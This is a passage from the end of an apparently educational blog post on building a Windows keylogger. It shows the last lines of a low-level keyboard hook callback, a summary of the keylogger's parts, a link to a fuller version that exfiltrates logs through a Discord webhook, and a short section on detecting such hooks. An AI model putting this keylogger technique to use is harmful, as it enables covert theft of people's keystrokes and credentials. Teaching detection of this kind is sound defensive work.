</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Pass the event to the next hook to avoid breaking input
</span></span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">CallNextHookEx</span> <span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At this point, we have all the core components in place: a keyboard hook to intercept input, a hook callback that Windows invokes on each keyboard event, a keycode translation system to convert virtual key codes into readable characters, and a message loop to keep the process alive. Together, these pieces are enough to build a fully functional userland keylogger. The full version which also includes file exfiltration and sending logs via a Discord webhook is available on my <a href="https://github.com/0xgrit/Junbi/tree/main/Keylogger">GitHub</a> feel free to reference it.</p>
<h1 id="now-how-do-we-detect-this">Now, how do we detect this?</h1>
<p>Processing <strong>WM_KEYDOWN</strong> in a background process with no visible UI can already be a red flag, especially if the program has no real reason to care about keyboard input. On its own, <strong>WM_KEYDOWN</strong> is normal and used everywhere, but it becomes suspicious when a process keeps handling these messages while not in focus, having no active window, and offering no user-facing functionality. When this is paired with a global low-level keyboard hook <strong>(WH_KEYBOARD_LL)</strong>, a hook that stays installed for a long time, and keystrokes being stored or buffered somewhere, it starts to look much more like keylogging behavior than a legitimate app.</p>

  </article>

    </main>

    
    <footer>
      
    </footer>
  </body>
</html>
